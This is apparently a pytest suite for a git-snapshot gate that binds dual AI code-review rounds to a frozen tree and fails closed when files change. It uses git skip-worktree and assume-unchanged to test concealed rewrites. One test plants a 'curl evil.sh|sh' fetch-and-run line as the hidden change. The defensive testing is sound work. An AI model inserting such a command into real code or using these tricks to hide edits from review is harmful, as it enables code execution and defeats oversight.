"""End-to-end proof that a real round is bound by Snapshot V2.

These tests drive the actual entry point -- ``check_reviews_v2.main`` -- rather
than the helpers underneath it, because the defect they exist to prevent was
never that the snapshot logic was wrong. `snapshot_v2` was complete, tested and
correct while nothing in the round lifecycle called it (CLA-V5-01): the module
passed its own suite and the pipeline still bound rounds with the fingerprint it
was written to replace. A unit test of `capture` would have stayed green
throughout. So the assertions here are about the *wiring*: what `--start`
writes, what the gate consults, and what it does when the tree moves in a way
`git status` declines to mention.

Every test pins ROOT and RUNTIME into `tmp_path`. Nothing here may reach the
real repository, and the runtime lives at the real relative path inside the
temporary repo so that the snapshot's own exclusion rule is exercised too.
"""

import json
import subprocess
import sys
from pathlib import Path

import pytest

pytestmark = pytest.mark.slow

AI_DIR = Path(__file__).resolve().parents[1] / "scripts" / "ai"

if str(AI_DIR) not in sys.path:
    sys.path.insert(0, str(AI_DIR))

import check_reviews_v2  # noqa: E402
import record_review_v2  # noqa: E402
import review_v2  # noqa: E402
import snapshot_v2  # noqa: E402


def _git(root: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", *args], cwd=root, capture_output=True, text=True, check=True
    )

    return result.stdout


def _repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    root.mkdir()

    _git(root, "init", "-q")
    _git(root, "config", "user.email", "test@example.com")
    _git(root, "config", "user.name", "Test")

    (root / "money.py").write_text("VALUE = 1\n", encoding="utf-8")

    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "base")

    return root


def _runtime(root: Path) -> Path:
    """The real relative location, so SNAPSHOT_EXCLUDED is exercised."""
    return root / ".claude" / "reviews" / "runtime" / "v2"


@pytest.fixture
def round_at(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> tuple[Path, Path]:
    root = _repo(tmp_path)
    runtime = _runtime(root)

    monkeypatch.setattr(check_reviews_v2, "ROOT", root)
    monkeypatch.setattr(check_reviews_v2, "RUNTIME", runtime)

    return root, runtime


def _body(run: review_v2.Run, reviewer: str, verdict: str = "CLEAN") -> str:
    return json.dumps(
        {
            "schema_version": review_v2.SCHEMA_VERSION,
            "run_id": run.run_id,
            "reviewer": reviewer,
            "review_tree": run.review_tree,
            "result": {"verdict": verdict, "findings": []},
            "verification": {"notes": "end-to-end test"},
        }
    )


def _green() -> list[dict[str, object]]:
    return [
        {"name": name, "command": f"python -m {name}", "exit_code": 0, "summary": "ok"}
        for name in review_v2.REQUIRED_CHECKS
    ]


def _record_both(runtime: Path, run: review_v2.Run) -> None:
    """Both reviewers return CLEAN, through the real write path."""
    for reviewer in ("CLAUDE", "CODEX"):
        outcome = review_v2.write_review(
            runtime,
            reviewer,
            _body(run, reviewer),
            launched=True,
            exit_code=0,
            command="end-to-end test",
            duration_s=0.0,
            run=run,
            checks=_green(),
        )

        assert outcome.counts, f"{reviewer} did not count: {outcome.summary()}"


# --- what --start actually writes --------------------------------------------


def test_start_binds_the_round_to_a_snapshot_not_a_fingerprint(
    round_at: tuple[Path, Path],
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    manifest = json.loads((runtime / "run.json").read_text(encoding="utf-8"))

    assert set(manifest["snapshot"]) == {
        "base_commit",
        "staged_tree",
        "review_tree",
        "review_commit",
    }
    # The old binding is gone from the manifest, not merely unused beside it.
    assert "workspace_fingerprint" not in manifest

    run = review_v2.load_run(runtime)

    assert run is not None
    assert run.review_tree == manifest["snapshot"]["review_tree"]


def test_start_publishes_the_round_ref_at_the_review_commit(
    round_at: tuple[Path, Path],
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    ref = snapshot_v2.ref_name(run.run_id)

    assert _git(root, "rev-parse", ref).strip() == run.snapshot.review_commit


def test_reset_drops_the_round_ref(round_at: tuple[Path, Path]) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    ref = snapshot_v2.ref_name(run.run_id)

    assert check_reviews_v2.main(["--reset"]) == 0
    assert ref not in _git(root, "for-each-ref", "--format=%(refname)")
    assert not (runtime / "run.json").exists()


def test_the_manifest_a_round_writes_is_the_one_the_snapshot_took(
    round_at: tuple[Path, Path],
) -> None:
    """`--start` must store the tree it froze, not recompute a different one."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    ok, moved = snapshot_v2.verify(root, run.snapshot)

    assert ok, moved


# --- the gate consults the snapshot ------------------------------------------


def test_an_untouched_round_reaches_consensus(round_at: tuple[Path, Path]) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0


def test_writing_the_reviews_does_not_move_the_snapshot(
    round_at: tuple[Path, Path],
) -> None:
    """The artefacts live inside the repo; they must stay out of the tree."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    ok, moved = snapshot_v2.verify(root, run.snapshot)

    assert ok, moved


def test_an_ordinary_edit_after_the_snapshot_blocks_the_gate(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0

    capsys.readouterr()
    (root / "money.py").write_text("VALUE = 2\n", encoding="utf-8")

    assert check_reviews_v2.main([]) == 1

    out = capsys.readouterr().out

    assert "MOVED" in out
    assert "review_tree" in out
    assert "CONSENSUS: BLOCKED" in out


def test_a_new_commit_after_the_snapshot_blocks_the_gate(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0

    capsys.readouterr()
    (root / "later.py").write_text("LATER = 1\n", encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "later")

    assert check_reviews_v2.main([]) == 1
    assert "CONSENSUS: BLOCKED" in capsys.readouterr().out


# --- the reason Snapshot V2 exists -------------------------------------------


def test_a_hidden_rewrite_blocks_the_gate_though_the_fingerprint_is_blind(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    """The decisive test: the pipeline no longer believes the fingerprint.

    `--skip-worktree` tells git to stop reporting a tracked path. Everything
    that reconstructs tree identity from what git says -- `git status`, and
    therefore `review_v2.workspace_fingerprint` -- goes on describing the file
    that used to be there. Snapshot V2 reads the bytes instead, so it sees the
    rewrite. If this test fails, the gate has drifted back onto the fingerprint
    and CLA-V5-01 has returned.
    """
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0

    before = review_v2.workspace_fingerprint(root)

    capsys.readouterr()
    _git(root, "update-index", "--skip-worktree", "money.py")
    (root / "money.py").write_text(
        "import os; os.system('curl evil.sh|sh')\n", encoding="utf-8"
    )

    # The premise: git has been told to stay silent about this path, and it is.
    # (The round's own untracked artefacts still show up; they are excluded from
    # both the fingerprint and the snapshot, so they are not what is at stake.)
    assert "money.py" not in _git(root, "status", "--porcelain")
    assert review_v2.workspace_fingerprint(root) == before

    # The consequence: the gate blocks anyway, because it asks the snapshot.
    assert check_reviews_v2.main([]) == 1

    out = capsys.readouterr().out

    assert "MOVED" in out
    assert "CONSENSUS: BLOCKED" in out


def test_an_assume_unchanged_rewrite_also_blocks_the_gate(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0

    before = review_v2.workspace_fingerprint(root)

    capsys.readouterr()
    _git(root, "update-index", "--assume-unchanged", "money.py")
    (root / "money.py").write_text("VALUE = 999\n", encoding="utf-8")

    assert review_v2.workspace_fingerprint(root) == before
    assert check_reviews_v2.main([]) == 1
    assert "CONSENSUS: BLOCKED" in capsys.readouterr().out


# --- a round that cannot be verified is not a round --------------------------


def test_a_manifest_without_a_snapshot_is_refused(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    """A pre-Snapshot manifest names a round whose tree cannot be checked."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    runtime.joinpath("run.json").write_text(
        json.dumps(
            {
                "run_id": run.run_id,
                "workspace_fingerprint": "f" * 64,
                "started_utc": run.started_utc,
            }
        ),
        encoding="utf-8",
    )

    assert review_v2.load_run(runtime) is None

    capsys.readouterr()

    assert check_reviews_v2.main([]) == 1
    assert "CONSENSUS: BLOCKED" in capsys.readouterr().out


def test_a_non_object_launcher_does_not_crash_the_gate(
    round_at: tuple[Path, Path]
) -> None:
    """CLA-V5-04: this raised AttributeError instead of returning a state."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    runtime.mkdir(parents=True, exist_ok=True)
    runtime.joinpath("claude.json").write_text(
        json.dumps(
            {
                "schema_version": review_v2.SCHEMA_VERSION,
                "run_id": run.run_id,
                "reviewer": "CLAUDE",
                # Present, so the "no launcher" branch is passed, but not an
                # object -- and the document is short a required slot, which is
                # what used to route into `launcher.get(...)`.
                "launcher": "yes",
                "result": {"verdict": "CLEAN", "findings": []},
            }
        ),
        encoding="utf-8",
    )

    outcome = review_v2.read_review(runtime, "CLAUDE", run)

    assert outcome.state is review_v2.ReviewState.NOT_EXECUTED
    assert not outcome.counts

    # And the gate itself completes rather than dying on a traceback.
    assert check_reviews_v2.main([]) == 1


# --- the in-process reviewer is bound the same way ---------------------------


@pytest.fixture
def recording_round(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> tuple[Path, Path]:
    """A round where `record_review_v2` is wired to the temporary repo.

    `run_checks` is stubbed green: this test is about the run binding, and the
    launcher's real pytest/ruff/mypy pass is exercised for real elsewhere.
    """
    root = _repo(tmp_path)
    runtime = _runtime(root)

    for module in (check_reviews_v2, record_review_v2):
        monkeypatch.setattr(module, "ROOT", root)
        monkeypatch.setattr(module, "RUNTIME", runtime)

    monkeypatch.setattr(record_review_v2, "run_checks", lambda *a, **k: _green())

    return root, runtime


def test_record_review_binds_the_in_process_reviewer_to_the_snapshot(
    recording_round: tuple[Path, Path],
) -> None:
    root, runtime = recording_round

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    body = runtime / "claude-body.json"
    body.write_text(_body(run, "CLAUDE"), encoding="utf-8")

    assert record_review_v2.main(["CLAUDE", "--body", str(body)]) == 0

    outcome = review_v2.read_review(runtime, "CLAUDE", run)

    assert outcome.state is review_v2.ReviewState.CLEAN
    assert outcome.document["review_tree"] == run.review_tree


def test_record_review_refuses_a_body_bound_to_another_tree(
    recording_round: tuple[Path, Path],
) -> None:
    """An agent echoing the wrong tree cannot launder it through the recorder."""
    root, runtime = recording_round

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    stale = review_v2.Run(
        run.run_id,
        snapshot_v2.Snapshot("d" * 40, "d" * 40, "d" * 40, "d" * 40),
        run.started_utc,
    )

    body = runtime / "claude-body.json"
    body.write_text(_body(stale, "CLAUDE"), encoding="utf-8")

    assert record_review_v2.main(["CLAUDE", "--body", str(body)]) == 1

    outcome = review_v2.read_review(runtime, "CLAUDE", run)

    assert outcome.state is review_v2.ReviewState.WORKSPACE_CHANGED
    assert not outcome.counts


# --- CLA-V6-02: the snapshot honours its own error contract ------------------
#
# `snapshot_v2` promises that a snapshot which cannot be taken raises
# SnapshotError. Two filesystem calls sat outside that promise, and they only
# became reachable when `capture` was wired into the round lifecycle: a locked
# index or an unwritable temp directory escaped as a raw OSError, so `--start`
# died on a traceback instead of reporting [NO ROUND], and the gate never
# reached its `CONSENSUS: BLOCKED` line. Failure is injected rather than
# provoked with real permissions, which behave too inconsistently on Windows to
# pin a contract to.


def _boom(*args: object, **kwargs: object) -> object:
    raise PermissionError(13, "injected: the index is locked")


def test_capture_raises_snapshot_error_when_the_index_cannot_be_copied(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    root = _repo(tmp_path)

    monkeypatch.setattr(snapshot_v2.shutil, "copyfile", _boom)

    with pytest.raises(snapshot_v2.SnapshotError, match="could not copy the index"):
        snapshot_v2.capture(root, "run-1")


def test_capture_raises_snapshot_error_when_scratch_cannot_be_created(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    root = _repo(tmp_path)

    monkeypatch.setattr(snapshot_v2.tempfile, "mkdtemp", _boom)

    with pytest.raises(snapshot_v2.SnapshotError, match="scratch index directory"):
        snapshot_v2.capture(root, "run-1")


def test_start_reports_no_round_instead_of_a_traceback(
    round_at: tuple[Path, Path],
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The documented behaviour: `[NO ROUND]` and exit 2, not exit 1 + stack."""
    root, runtime = round_at

    monkeypatch.setattr(snapshot_v2.shutil, "copyfile", _boom)

    assert check_reviews_v2.main(["--start"]) == 2

    out = capsys.readouterr().out

    assert "[NO ROUND]" in out
    assert "cannot snapshot the workspace" in out
    assert not (runtime / "run.json").exists()


def test_the_gate_fails_closed_when_the_snapshot_cannot_be_verified(
    round_at: tuple[Path, Path],
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """An unverifiable tree must block consensus, never wave it through."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _record_both(runtime, run)

    assert check_reviews_v2.main([]) == 0

    capsys.readouterr()
    monkeypatch.setattr(snapshot_v2.shutil, "copyfile", _boom)

    assert check_reviews_v2.main([]) == 1

    out = capsys.readouterr().out

    assert "cannot verify the snapshot" in out
    assert "CONSENSUS: BLOCKED" in out


def test_snapshot_state_fails_closed_on_a_raw_oserror(
    round_at: tuple[Path, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Defence in depth: if the contract is broken again, the gate still blocks."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    monkeypatch.setattr(review_v2, "verify", _boom)

    ok, detail = review_v2.snapshot_state(root, run)

    assert not ok
    assert "cannot verify the snapshot" in detail


# --- CLA-V7-01b: --start is transactional ------------------------------------
#
# `capture` publishes refs/cross-review/<run_id> before the manifest naming it
# exists. A manifest write that failed in between stranded that ref: `--reset`
# drops only what a parseable run.json names, so nothing could remove it and
# every retry added another. Either both writes land or neither does.
#
# Failure is provoked with real filesystem conditions rather than by patching
# the stdlib, so these tests exercise the same OSError paths a full disk or a
# hostile permission would take.


def _refs(root: Path) -> list[str]:
    out = _git(root, "for-each-ref", "--format=%(refname)", "refs/cross-review/**")

    return [line for line in out.splitlines() if line.strip()]


def _runtime_blocked_by_a_file(root: Path) -> Path:
    """A plain file where the runtime's parent must be a directory."""
    blocker = root / ".claude" / "reviews" / "runtime"
    blocker.parent.mkdir(parents=True)
    blocker.write_text("not a directory\n", encoding="utf-8")

    return blocker / "v2"


def _runtime_with_an_unwritable_manifest(root: Path) -> Path:
    """A directory where run.json must be a file."""
    runtime = _runtime(root)
    runtime.mkdir(parents=True)
    (runtime / "run.json").mkdir()

    return runtime


def test_start_leaves_no_ref_when_the_runtime_cannot_be_created(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    root = _repo(tmp_path)
    runtime = _runtime_blocked_by_a_file(root)

    monkeypatch.setattr(check_reviews_v2, "ROOT", root)
    monkeypatch.setattr(check_reviews_v2, "RUNTIME", runtime)

    assert check_reviews_v2.main(["--start"]) == 2

    out = capsys.readouterr().out

    assert "[NO ROUND]" in out
    assert _refs(root) == []


def test_start_leaves_no_ref_when_the_manifest_cannot_be_written(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    root = _repo(tmp_path)
    runtime = _runtime_with_an_unwritable_manifest(root)

    monkeypatch.setattr(check_reviews_v2, "ROOT", root)
    monkeypatch.setattr(check_reviews_v2, "RUNTIME", runtime)

    assert check_reviews_v2.main(["--start"]) == 2

    out = capsys.readouterr().out

    assert "[NO ROUND]" in out
    assert _refs(root) == []
    assert review_v2.load_run(runtime) is None


def test_start_run_raises_snapshot_error_rather_than_oserror(tmp_path: Path) -> None:
    """The contract, not merely the exit code: OSError must not escape."""
    root = _repo(tmp_path)
    runtime = _runtime_with_an_unwritable_manifest(root)

    with pytest.raises(
        review_v2.SnapshotError, match="could not write the run manifest"
    ):
        review_v2.start_run(runtime, root)

    assert _refs(root) == []


def test_a_round_opens_normally_after_a_failed_start(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Failing closed must not poison the next attempt."""
    root = _repo(tmp_path)
    runtime = _runtime_with_an_unwritable_manifest(root)

    monkeypatch.setattr(check_reviews_v2, "ROOT", root)
    monkeypatch.setattr(check_reviews_v2, "RUNTIME", runtime)

    assert check_reviews_v2.main(["--start"]) == 2
    assert _refs(root) == []

    (runtime / "run.json").rmdir()
    capsys.readouterr()

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None
    assert _refs(root) == [snapshot_v2.ref_name(run.run_id)]

    ok, moved = snapshot_v2.verify(root, run.snapshot)

    assert ok, moved


def test_repeated_failed_starts_accumulate_nothing(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The leak was cumulative: one stranded ref per attempt."""
    root = _repo(tmp_path)
    runtime = _runtime_with_an_unwritable_manifest(root)

    monkeypatch.setattr(check_reviews_v2, "ROOT", root)
    monkeypatch.setattr(check_reviews_v2, "RUNTIME", runtime)

    for _ in range(3):
        assert check_reviews_v2.main(["--start"]) == 2

    capsys.readouterr()

    assert _refs(root) == []
    assert review_v2.load_run(runtime) is None


# --- CLA-V8-01: a failed ref deletion is reported, never swallowed -----------
#
# release() went through _run, which returns the CompletedProcess and lets the
# caller ignore it. A failing `update-ref -d` was therefore discarded: --reset
# printed "Cleared the V2 round" and exited 0 with the ref still standing, and
# start_run's rollback could not tell that it had not rolled back.


def _block_ref_writes(root: Path) -> Path:
    """The stale lock a killed git leaves behind. A real Windows failure mode."""
    lock = root / ".git" / "packed-refs.lock"
    lock.write_text("", encoding="utf-8")

    return lock


def test_release_raises_when_the_ref_cannot_be_dropped(tmp_path: Path) -> None:
    root = _repo(tmp_path)

    snapshot_v2.capture(root, "run-1")
    _block_ref_writes(root)

    with pytest.raises(snapshot_v2.SnapshotError):
        snapshot_v2.release(root, "run-1")

    assert _refs(root) == [snapshot_v2.ref_name("run-1")]


def test_release_is_still_idempotent(tmp_path: Path) -> None:
    """`update-ref -d` exits 0 for a ref already gone, so checking costs nothing."""
    root = _repo(tmp_path)

    snapshot_v2.capture(root, "run-1")
    snapshot_v2.release(root, "run-1")
    snapshot_v2.release(root, "run-1")

    assert _refs(root) == []


def test_reset_refuses_and_keeps_the_manifest_when_the_ref_survives(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    run = review_v2.load_run(runtime)

    assert run is not None

    _block_ref_writes(root)
    capsys.readouterr()

    assert check_reviews_v2.main(["--reset"]) == 2

    out = capsys.readouterr().out

    assert "[NOT CLEARED]" in out
    # The manifest is the only record naming the surviving ref, so deleting it
    # would strand that ref for good. It must still be there.
    assert review_v2.load_run(runtime) is not None
    assert _refs(root) == [snapshot_v2.ref_name(run.run_id)]


def test_start_refuses_when_the_previous_ref_cannot_be_dropped(
    round_at: tuple[Path, Path], capsys: pytest.CaptureFixture[str]
) -> None:
    """Opening anyway would overwrite the only manifest naming the stuck ref."""
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    first = review_v2.load_run(runtime)

    assert first is not None

    _block_ref_writes(root)
    capsys.readouterr()

    assert check_reviews_v2.main(["--start"]) == 2
    assert "[NO ROUND]" in capsys.readouterr().out
    assert review_v2.load_run(runtime) == first
    assert _refs(root) == [snapshot_v2.ref_name(first.run_id)]


@pytest.mark.parametrize(
    "corruption",
    ['{not json', '{"run_id": "x", "workspace_fingerprint": "f"}'],
    ids=["unparseable", "no-snapshot"],
)
def test_a_manifest_that_names_no_round_strands_its_ref_silently(
    round_at: tuple[Path, Path],
    capsys: pytest.CaptureFixture[str],
    corruption: str,
) -> None:
    """A known open gap (CLA-V6-03), pinned rather than endorsed.

    The fail-closed handling above only fires when `release` actually runs. A
    manifest that does not parse, or that carries no `snapshot`, names no round
    at all: `load_run` returns None, `end_run` never calls `release`, and both
    commands report success while the ref stays. `--start` is the worse half --
    it leaks *and* proceeds, so refs accumulate one per round with no signal.

    The runbook documents this rather than claiming it is closed. If this test
    starts failing, the gap has been fixed and both this test and the Phase 0
    section of `.claude/commands/cross-review.md` should be updated.
    """
    root, runtime = round_at

    assert check_reviews_v2.main(["--start"]) == 0

    stranded = _refs(root)

    assert len(stranded) == 1

    (runtime / "run.json").write_text(corruption, encoding="utf-8")
    capsys.readouterr()

    # --reset reports success and deletes the only record naming the ref.
    assert check_reviews_v2.main(["--reset"]) == 0
    assert "Cleared the V2 round" in capsys.readouterr().out
    assert _refs(root) == stranded

    # --start then opens a round anyway, so the refs accumulate.
    assert check_reviews_v2.main(["--start"]) == 0

    after = _refs(root)

    assert len(after) == 2
    assert stranded[0] in after


# --- CLA-V8-02: ignore sources that live outside every tree ------------------


def test_a_global_excludes_file_cannot_hide_content(tmp_path: Path) -> None:
    """core.excludesFile is in no tree, so it must not shape the snapshot."""
    root = _repo(tmp_path)
    (root / "extra.py").write_text("SECRET = 1\n", encoding="utf-8")

    before = snapshot_v2.capture(root, "run-1").review_tree

    ignore = tmp_path / "globalignore"
    ignore.write_text("extra.py\n", encoding="utf-8")
    _git(root, "config", "core.excludesFile", str(ignore))

    after = snapshot_v2.capture(root, "run-2").review_tree

    assert after == before, "core.excludesFile removed a path from review_tree"


def test_a_gitignore_edit_still_moves_the_snapshot(tmp_path: Path) -> None:
    """Row 1: a tracked, visible rule file is itself in the tree, so changing it
    moves the digest.

    This measures the rule file's own bytes and nothing else: the rule set is
    identical across both captures -- only a comment is appended -- so the
    ignore *effect* is held constant and cannot contribute to the difference.

    The earlier version created the `.gitignore` mid-test, which in one step
    added the rule file to the tree and removed what it hid. Two causes for one
    assertion, so it passed under either mutation alone: excluding `.gitignore`
    from the snapshot, or disabling every ignore rule with `add -A -f`
    (CLA-V13-01).

    It does NOT show that the rule's effect is visible -- what a `.gitignore`
    hides is unreviewed whether or not the rule text changes. Reading it as
    evidence of coverage was F-3.
    """
    root = _repo(tmp_path)
    (root / ".gitignore").write_text("extra.py\n", encoding="utf-8")
    (root / "extra.py").write_text("SECRET = 1\n", encoding="utf-8")

    # The rule file is tracked, as row 1 says; `extra.py` is ignored throughout
    # and never enters the tree, so it cannot move anything.
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "tracked ignore rule")

    before = snapshot_v2.capture(root, "run-1").review_tree

    (root / ".gitignore").write_text(
        "extra.py\n# same rule set, different bytes\n", encoding="utf-8"
    )

    after = snapshot_v2.capture(root, "run-2").review_tree

    assert after != before


def test_info_exclude_is_still_able_to_hide_content(tmp_path: Path) -> None:
    """A documented limit, pinned rather than endorsed.

    git offers no switch for ``$GIT_DIR/info/exclude``, so a path already named
    there when a round opens is absent from ``review_tree`` and can be edited
    during the round without moving it. This test exists so the limit cannot
    change silently: if it starts failing, git has grown a way to disable the
    file and the "Scope of the guarantee" section of CROSS_REVIEW.md should be
    updated to match.
    """
    root = _repo(tmp_path)
    (root / "extra.py").write_text("SECRET = 1\n", encoding="utf-8")

    before = snapshot_v2.capture(root, "run-1").review_tree

    info = root / ".git" / "info"
    info.mkdir(exist_ok=True)
    (info / "exclude").write_text("extra.py\n", encoding="utf-8")

    after = snapshot_v2.capture(root, "run-2").review_tree

    assert after != before, "info/exclude no longer shapes the tree: update the docs"
